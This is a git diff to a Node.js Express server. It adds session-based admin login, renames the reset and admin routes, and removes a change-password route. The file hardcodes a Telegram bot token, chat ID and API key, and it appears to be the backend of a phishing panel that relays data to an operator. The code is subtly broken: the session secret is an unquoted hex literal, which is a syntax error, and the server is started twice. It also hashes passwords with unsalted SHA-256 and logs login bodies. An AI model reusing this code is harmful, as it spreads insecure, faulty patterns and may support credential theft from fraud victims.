@@ -6,6 +6,7 @@ const { sendMessageFor } = require('simple-telegram-message');
 const crypto = require('crypto');
 const path = require('path');
 const fs = require('fs').promises;
+const session = require('express-session');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -15,6 +16,13 @@ const API_URL = 'https://api-bdc.net/data/ip-geolocation?ip=';
 const API_KEY = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const botToken = "5433611121:AAFMpeQpC5y_y0PveL5sd77QQIXHuz6TOr4";
 const chatId = "5200289419";
+
+app.use(session({
+    secret: 3f73f14e9b29c8f5a6c1d3ee67d2a8a42a99e02e3f5b678d3d6a81f96b4873a2, // Replace with a strong secret key
+    resave: false,
+    saveUninitialized: false,
+    cookie: { secure: false } // Set to true if using HTTPS
+}));
 
 app.use(express.static('public'));
 app.use(bodyParser.json());
@@ -134,11 +142,11 @@ function broadcastAdminPanel(currPage, stats) {
     });
 }
 
-app.get('/reset-password-form', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'reset-password.html'));
+app.get('/forgot', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'reset.html'));
 });
 
-app.post('/reset-password', (req, res) => {
+app.post('/forgot', (req, res) => {
     const { apiKey, username, newPassword } = req.body;
     const hashedNewPassword = crypto.createHash('sha256').update(newPassword).digest('hex');
 
@@ -381,13 +389,15 @@ app.post('/process-request', async (req, res) => {
 });
 
 
-// Route to serve the login HTML file
+// Setup session middleware
+
+
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 // Route to handle the login form submission
-app.post('/admin-login', (req, res) => {
+app.post('/admin', (req, res) => {
     const { username, password } = req.body;
     console.log('Received login request:', req.body);
 
@@ -399,19 +409,37 @@ app.post('/admin-login', (req, res) => {
     console.log('Hashed password:', hashedPassword);
 
     db.get("SELECT * FROM admin WHERE username = ? AND password = ?", [username, hashedPassword], (err, row) => {
-    	console.log('open row');
         if (err) {
             console.error(`Error retrieving admin: ${err.message}`);
             return res.status(500).send('Error retrieving admin');
         }
         if (row) {
-        	console.log(row);
-            // Read the contents of a file and send it as the response
-            res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+            console.log(row);
+            // Set the session variable
+            req.session.loggedIn = true;
+            // Redirect to the admin dashboard
+            res.redirect('/admin/dashboard');
         } else {
             res.status(401).send('Unauthorized: Invalid username or password');
         }
     });
+});
+
+// Middleware to check if user is logged in
+function checkAuth(req, res, next) {
+    if (req.session.loggedIn) {
+        return next();
+    } else {
+        res.status(401).send('Unauthorized: You need to log in first');
+    }
+}
+
+app.get('/admin/dashboard', checkAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+app.listen(3000, () => {
+    console.log('Server running on port 3000');
 });
 
 // Route to change the admin password
@@ -452,30 +480,7 @@ app.post('/confirm-api', (req, res) => {
     }
 });
 
-app.post('/change-password', (req, res) => {
-    const { username, newPassword } = req.body;
 
-    // Check if the user exists in the database
-    db.get("SELECT * FROM users WHERE username = ?", [username], (err, row) => {
-        if (err) {
-            console.error(`Error retrieving user: ${err.message}`);
-            return res.status(500).json({ success: false, message: 'Internal server error' });
-        }
-        
-        if (!row) {
-            return res.status(404).json({ success: false, message: 'User not found' });
-        }
-
-        // Update the password in the database
-        db.run("UPDATE users SET password = ? WHERE username = ?", [newPassword, username], (err) => {
-            if (err) {
-                console.error(`Error updating password: ${err.message}`);
-                return res.status(500).json({ success: false, message: 'Internal server error' });
-            }
-            res.json({ success: true, message: 'Password changed successfully' });
-        });
-    });
-});
 
 app.listen(port, () => {
     console.log(`Server running at http://localhost:${port}/`);
